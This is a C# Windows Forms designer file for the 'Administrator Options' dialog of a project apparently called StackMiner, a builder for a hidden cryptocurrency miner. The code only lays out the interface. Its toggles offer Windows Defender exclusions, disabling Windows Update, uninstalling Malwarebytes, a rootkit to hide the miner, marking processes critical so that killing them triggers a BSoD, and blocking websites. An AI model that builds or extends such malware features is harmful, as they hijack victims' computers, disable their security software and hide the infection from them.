using System;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace StackMiner
{
    [DesignerGenerated()]
    public partial class AdministratorOptions : Form
    {

        // Form overrides dispose to clean up the component list.
        [DebuggerNonUserCode()]
        protected override void Dispose(bool disposing)
        {
            try
            {
                if (disposing && components is object)
                {
                    components.Dispose();
                }
            }
            finally
            {
                base.Dispose(disposing);
            }
        }

        // Required by the Windows Form Designer
        private System.ComponentModel.IContainer components = null;

        // NOTE: The following procedure is required by the Windows Form Designer
        // It can be modified using the Windows Form Designer.  
        // Do not modify it using the code editor.
        [DebuggerStepThrough()]
        private void InitializeComponent()
        {
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(AdministratorOptions));
            this.formAdvancedOptions = new MephTheme();
            this.pictureBox2 = new System.Windows.Forms.PictureBox();
            this.label1 = new System.Windows.Forms.Label();
            this.chkUninstallMB = new MephToggleSwitch();
            this.picAdmin5 = new System.Windows.Forms.PictureBox();
            this.labelOptionProcessProtect = new System.Windows.Forms.Label();
            this.toggleProcessProtect = new MephToggleSwitch();
            this.picAdmin2 = new System.Windows.Forms.PictureBox();
            this.labelOptionWindowsUpdate = new System.Windows.Forms.Label();
            this.toggleWindowsUpdate = new MephToggleSwitch();
            this.picAdmin3 = new System.Windows.Forms.PictureBox();
            this.chkBlockWebsites = new MephCheckBox();
            this.txtBlockWebsites = new MephTextBox();
            this.picAdmin1 = new System.Windows.Forms.PictureBox();
            this.labelOptionWD = new System.Windows.Forms.Label();
            this.toggleWDExclusions = new MephToggleSwitch();
            this.pictureBox1 = new System.Windows.Forms.PictureBox();
            this.labelAdvancedOptionRootkit = new System.Windows.Forms.Label();
            this.toggleRootkit = new MephToggleSwitch();
            this.formAdvancedOptions.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox2)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.picAdmin5)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.picAdmin2)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.picAdmin3)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.picAdmin1)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).BeginInit();
            this.SuspendLayout();
            // 
            // formAdvancedOptions
            // 
            this.formAdvancedOptions.AccentColor = System.Drawing.Color.DarkRed;
            this.formAdvancedOptions.Anchor = System.Windows.Forms.AnchorStyles.None;
            this.formAdvancedOptions.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(28)))), ((int)(((byte)(28)))), ((int)(((byte)(28)))));
            this.formAdvancedOptions.Controls.Add(this.pictureBox2);
            this.formAdvancedOptions.Controls.Add(this.label1);
            this.formAdvancedOptions.Controls.Add(this.chkUninstallMB);
            this.formAdvancedOptions.Controls.Add(this.picAdmin5);
            this.formAdvancedOptions.Controls.Add(this.labelOptionProcessProtect);
            this.formAdvancedOptions.Controls.Add(this.toggleProcessProtect);
            this.formAdvancedOptions.Controls.Add(this.picAdmin2);
            this.formAdvancedOptions.Controls.Add(this.labelOptionWindowsUpdate);
            this.formAdvancedOptions.Controls.Add(this.toggleWindowsUpdate);
            this.formAdvancedOptions.Controls.Add(this.picAdmin3);
            this.formAdvancedOptions.Controls.Add(this.chkBlockWebsites);
            this.formAdvancedOptions.Controls.Add(this.txtBlockWebsites);
            this.formAdvancedOptions.Controls.Add(this.picAdmin1);
            this.formAdvancedOptions.Controls.Add(this.labelOptionWD);
            this.formAdvancedOptions.Controls.Add(this.toggleWDExclusions);
            this.formAdvancedOptions.Controls.Add(this.pictureBox1);
            this.formAdvancedOptions.Controls.Add(this.labelAdvancedOptionRootkit);
            this.formAdvancedOptions.Controls.Add(this.toggleRootkit);
            this.formAdvancedOptions.Font = new System.Drawing.Font("Segoe UI", 9.5F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(128)));
            this.formAdvancedOptions.Location = new System.Drawing.Point(0, 0);
            this.formAdvancedOptions.Name = "formAdvancedOptions";
            this.formAdvancedOptions.Size = new System.Drawing.Size(273, 307);
            this.formAdvancedOptions.SubHeader = "";
            this.formAdvancedOptions.TabIndex = 0;
            this.formAdvancedOptions.Text = "Administrator Options";
            // 
            // pictureBox2
            // 
            this.pictureBox2.BackColor = System.Drawing.Color.Transparent;
            this.pictureBox2.Image = global::StackMiner.Properties.Resources.microsoft_admin;
            this.pictureBox2.Location = new System.Drawing.Point(239, 123);
            this.pictureBox2.Name = "pictureBox2";
            this.pictureBox2.Size = new System.Drawing.Size(20, 20);
            this.pictureBox2.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.pictureBox2.TabIndex = 166;
            this.pictureBox2.TabStop = false;
            // 
            // label1
            // 
            this.label1.AutoEllipsis = true;
            this.label1.BackColor = System.Drawing.Color.Transparent;
            this.label1.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.label1.ForeColor = System.Drawing.Color.Gray;
            this.label1.Location = new System.Drawing.Point(10, 123);
            this.label1.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.label1.Name = "label1";
            this.label1.Size = new System.Drawing.Size(158, 17);
            this.label1.TabIndex = 165;
            this.label1.Text = "Uninstall Malwarebytes";
            // 
            // chkUninstallMB
            // 
            this.chkUninstallMB.BackColor = System.Drawing.Color.Transparent;
            this.chkUninstallMB.Checked = false;
            this.chkUninstallMB.ForeColor = System.Drawing.Color.Black;
            this.chkUninstallMB.Location = new System.Drawing.Point(184, 120);
            this.chkUninstallMB.Margin = new System.Windows.Forms.Padding(2);
            this.chkUninstallMB.Name = "chkUninstallMB";
            this.chkUninstallMB.Size = new System.Drawing.Size(50, 24);
            this.chkUninstallMB.TabIndex = 164;
            // 
            // picAdmin5
            // 
            this.picAdmin5.BackColor = System.Drawing.Color.Transparent;
            this.picAdmin5.Image = global::StackMiner.Properties.Resources.microsoft_admin;
            this.picAdmin5.Location = new System.Drawing.Point(239, 176);
            this.picAdmin5.Name = "picAdmin5";
            this.picAdmin5.Size = new System.Drawing.Size(20, 20);
            this.picAdmin5.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.picAdmin5.TabIndex = 163;
            this.picAdmin5.TabStop = false;
            // 
            // labelOptionProcessProtect
            // 
            this.labelOptionProcessProtect.AutoEllipsis = true;
            this.labelOptionProcessProtect.BackColor = System.Drawing.Color.Transparent;
            this.labelOptionProcessProtect.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.labelOptionProcessProtect.ForeColor = System.Drawing.Color.Gray;
            this.labelOptionProcessProtect.Location = new System.Drawing.Point(10, 177);
            this.labelOptionProcessProtect.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.labelOptionProcessProtect.Name = "labelOptionProcessProtect";
            this.labelOptionProcessProtect.Size = new System.Drawing.Size(157, 17);
            this.labelOptionProcessProtect.TabIndex = 162;
            this.labelOptionProcessProtect.Text = "Critical Processes (BSoD)";
            // 
            // toggleProcessProtect
            // 
            this.toggleProcessProtect.BackColor = System.Drawing.Color.Transparent;
            this.toggleProcessProtect.Checked = false;
            this.toggleProcessProtect.ForeColor = System.Drawing.Color.Black;
            this.toggleProcessProtect.Location = new System.Drawing.Point(184, 174);
            this.toggleProcessProtect.Margin = new System.Windows.Forms.Padding(2);
            this.toggleProcessProtect.Name = "toggleProcessProtect";
            this.toggleProcessProtect.Size = new System.Drawing.Size(50, 24);
            this.toggleProcessProtect.TabIndex = 161;
            // 
            // picAdmin2
            // 
            this.picAdmin2.BackColor = System.Drawing.Color.Transparent;
            this.picAdmin2.Image = global::StackMiner.Properties.Resources.microsoft_admin;
            this.picAdmin2.Location = new System.Drawing.Point(239, 96);
            this.picAdmin2.Name = "picAdmin2";
            this.picAdmin2.Size = new System.Drawing.Size(20, 20);
            this.picAdmin2.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.picAdmin2.TabIndex = 160;
            this.picAdmin2.TabStop = false;
            // 
            // labelOptionWindowsUpdate
            // 
            this.labelOptionWindowsUpdate.AutoEllipsis = true;
            this.labelOptionWindowsUpdate.BackColor = System.Drawing.Color.Transparent;
            this.labelOptionWindowsUpdate.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.labelOptionWindowsUpdate.ForeColor = System.Drawing.Color.Gray;
            this.labelOptionWindowsUpdate.Location = new System.Drawing.Point(10, 96);
            this.labelOptionWindowsUpdate.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.labelOptionWindowsUpdate.Name = "labelOptionWindowsUpdate";
            this.labelOptionWindowsUpdate.Size = new System.Drawing.Size(158, 17);
            this.labelOptionWindowsUpdate.TabIndex = 159;
            this.labelOptionWindowsUpdate.Text = "Disable Windows Update";
            // 
            // toggleWindowsUpdate
            // 
            this.toggleWindowsUpdate.BackColor = System.Drawing.Color.Transparent;
            this.toggleWindowsUpdate.Checked = false;
            this.toggleWindowsUpdate.ForeColor = System.Drawing.Color.Black;
            this.toggleWindowsUpdate.Location = new System.Drawing.Point(184, 93);
            this.toggleWindowsUpdate.Margin = new System.Windows.Forms.Padding(2);
            this.toggleWindowsUpdate.Name = "toggleWindowsUpdate";
            this.toggleWindowsUpdate.Size = new System.Drawing.Size(50, 24);
            this.toggleWindowsUpdate.TabIndex = 158;
            // 
            // picAdmin3
            // 
            this.picAdmin3.BackColor = System.Drawing.Color.Transparent;
            this.picAdmin3.ErrorImage = null;
            this.picAdmin3.Image = global::StackMiner.Properties.Resources.microsoft_admin;
            this.picAdmin3.Location = new System.Drawing.Point(146, 242);
            this.picAdmin3.Name = "picAdmin3";
            this.picAdmin3.Size = new System.Drawing.Size(20, 20);
            this.picAdmin3.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.picAdmin3.TabIndex = 157;
            this.picAdmin3.TabStop = false;
            // 
            // chkBlockWebsites
            // 
            this.chkBlockWebsites.AccentColor = System.Drawing.Color.ForestGreen;
            this.chkBlockWebsites.BackColor = System.Drawing.Color.Transparent;
            this.chkBlockWebsites.Checked = false;
            this.chkBlockWebsites.Cursor = System.Windows.Forms.Cursors.Hand;
            this.chkBlockWebsites.ForeColor = System.Drawing.Color.Black;
            this.chkBlockWebsites.Location = new System.Drawing.Point(13, 241);
            this.chkBlockWebsites.Margin = new System.Windows.Forms.Padding(2);
            this.chkBlockWebsites.Name = "chkBlockWebsites";
            this.chkBlockWebsites.Size = new System.Drawing.Size(146, 24);
            this.chkBlockWebsites.TabIndex = 156;
            this.chkBlockWebsites.Text = "Block Websites";
            this.chkBlockWebsites.CheckedChanged += new MephCheckBox.CheckedChangedEventHandler(this.chkBlockWebsites_CheckedChanged);
            // 
            // txtBlockWebsites
            // 
            this.txtBlockWebsites.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtBlockWebsites.Enabled = false;
            this.txtBlockWebsites.ForeColor = System.Drawing.Color.Silver;
            this.txtBlockWebsites.Location = new System.Drawing.Point(13, 269);
            this.txtBlockWebsites.Margin = new System.Windows.Forms.Padding(2);
            this.txtBlockWebsites.MaxLength = 32767;
            this.txtBlockWebsites.MultiLine = false;
            this.txtBlockWebsites.Name = "txtBlockWebsites";
            this.txtBlockWebsites.ReadOnly = false;
            this.txtBlockWebsites.Size = new System.Drawing.Size(246, 24);
            this.txtBlockWebsites.TabIndex = 155;
            this.txtBlockWebsites.Text = resources.GetString("txtBlockWebsites.Text");
            this.txtBlockWebsites.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtBlockWebsites.UseSystemPasswordChar = false;
            this.txtBlockWebsites.WordWrap = false;
            // 
            // picAdmin1
            // 
            this.picAdmin1.BackColor = System.Drawing.Color.Transparent;
            this.picAdmin1.Image = global::StackMiner.Properties.Resources.microsoft_admin;
            this.picAdmin1.Location = new System.Drawing.Point(239, 69);
            this.picAdmin1.Name = "picAdmin1";
            this.picAdmin1.Size = new System.Drawing.Size(20, 20);
            this.picAdmin1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.picAdmin1.TabIndex = 154;
            this.picAdmin1.TabStop = false;
            // 
            // labelOptionWD
            // 
            this.labelOptionWD.AutoEllipsis = true;
            this.labelOptionWD.BackColor = System.Drawing.Color.Transparent;
            this.labelOptionWD.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.labelOptionWD.ForeColor = System.Drawing.Color.Gray;
            this.labelOptionWD.Location = new System.Drawing.Point(10, 69);
            this.labelOptionWD.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.labelOptionWD.Name = "labelOptionWD";
            this.labelOptionWD.Size = new System.Drawing.Size(158, 17);
            this.labelOptionWD.TabIndex = 153;
            this.labelOptionWD.Text = "Add Defender Exclusions";
            // 
            // toggleWDExclusions
            // 
            this.toggleWDExclusions.BackColor = System.Drawing.Color.Transparent;
            this.toggleWDExclusions.Checked = true;
            this.toggleWDExclusions.ForeColor = System.Drawing.Color.Black;
            this.toggleWDExclusions.Location = new System.Drawing.Point(184, 66);
            this.toggleWDExclusions.Margin = new System.Windows.Forms.Padding(2);
            this.toggleWDExclusions.Name = "toggleWDExclusions";
            this.toggleWDExclusions.Size = new System.Drawing.Size(50, 24);
            this.toggleWDExclusions.TabIndex = 152;
            // 
            // pictureBox1
            // 
            this.pictureBox1.BackColor = System.Drawing.Color.Transparent;
            this.pictureBox1.Image = global::StackMiner.Properties.Resources.microsoft_admin;
            this.pictureBox1.Location = new System.Drawing.Point(239, 149);
            this.pictureBox1.Name = "pictureBox1";
            this.pictureBox1.Size = new System.Drawing.Size(20, 20);
            this.pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.pictureBox1.TabIndex = 149;
            this.pictureBox1.TabStop = false;
            // 
            // labelAdvancedOptionRootkit
            // 
            this.labelAdvancedOptionRootkit.AutoEllipsis = true;
            this.labelAdvancedOptionRootkit.BackColor = System.Drawing.Color.Transparent;
            this.labelAdvancedOptionRootkit.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.labelAdvancedOptionRootkit.ForeColor = System.Drawing.Color.Gray;
            this.labelAdvancedOptionRootkit.Location = new System.Drawing.Point(10, 149);
            this.labelAdvancedOptionRootkit.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.labelAdvancedOptionRootkit.Name = "labelAdvancedOptionRootkit";
            this.labelAdvancedOptionRootkit.Size = new System.Drawing.Size(157, 17);
            this.labelAdvancedOptionRootkit.TabIndex = 148;
            this.labelAdvancedOptionRootkit.Text = "Use Rootkit (Hide Miner)";
            // 
            // toggleRootkit
            // 
            this.toggleRootkit.BackColor = System.Drawing.Color.Transparent;
            this.toggleRootkit.Checked = false;
            this.toggleRootkit.ForeColor = System.Drawing.Color.Black;
            this.toggleRootkit.Location = new System.Drawing.Point(184, 147);
            this.toggleRootkit.Margin = new System.Windows.Forms.Padding(2);
            this.toggleRootkit.Name = "toggleRootkit";
            this.toggleRootkit.Size = new System.Drawing.Size(50, 24);
            this.toggleRootkit.TabIndex = 147;
            // 
            // AdministratorOptions
            // 
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.None;
            this.ClientSize = new System.Drawing.Size(273, 307);
            this.Controls.Add(this.formAdvancedOptions);
            this.Font = new System.Drawing.Font("Microsoft Sans Serif", 5.729167F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(128)));
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
            this.MaximizeBox = false;
            this.MaximumSize = new System.Drawing.Size(436, 307);
            this.MinimizeBox = false;
            this.Name = "AdministratorOptions";
            this.Opacity = 0.95D;
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.Text = "Advanced";
            this.TransparencyKey = System.Drawing.Color.Fuchsia;
            this.FormClosing += new System.Windows.Forms.FormClosingEventHandler(this.advancedOptions_FormClosing);
            this.formAdvancedOptions.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox2)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.picAdmin5)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.picAdmin2)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.picAdmin3)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.picAdmin1)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).EndInit();
            this.ResumeLayout(false);

        }

        internal MephTheme formAdvancedOptions;
        internal PictureBox pictureBox1;
        internal Label labelAdvancedOptionRootkit;
        internal MephToggleSwitch toggleRootkit;
        internal PictureBox picAdmin5;
        internal Label labelOptionProcessProtect;
        internal MephToggleSwitch toggleProcessProtect;
        internal PictureBox picAdmin2;
        internal Label labelOptionWindowsUpdate;
        internal MephToggleSwitch toggleWindowsUpdate;
        internal PictureBox picAdmin3;
        internal MephCheckBox chkBlockWebsites;
        internal MephTextBox txtBlockWebsites;
        internal PictureBox picAdmin1;
        internal Label labelOptionWD;
        internal MephToggleSwitch toggleWDExclusions;
        internal PictureBox pictureBox2;
        internal Label label1;
        internal MephToggleSwitch chkUninstallMB;
    }
}